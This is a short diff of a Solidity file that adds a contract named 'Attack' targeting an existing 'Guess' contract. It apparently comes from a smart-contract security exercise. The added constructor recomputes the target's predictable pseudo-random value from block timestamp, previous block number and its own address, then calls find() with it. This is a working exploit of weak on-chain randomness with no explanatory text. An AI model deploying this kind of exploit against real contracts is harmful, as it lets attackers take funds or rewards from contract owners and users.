@@ -24,3 +24,12 @@ contract Guess {
     }
 
 }
+
+contract Attack {
+
+    constructor(address _target){
+        Guess _ins = Guess(_target);
+        uint _answer = uint(keccak256(abi.encodePacked(block.timestamp,block.number-1,address(this)))) % 100;
+        _ins.find(_answer);
+    }
+}
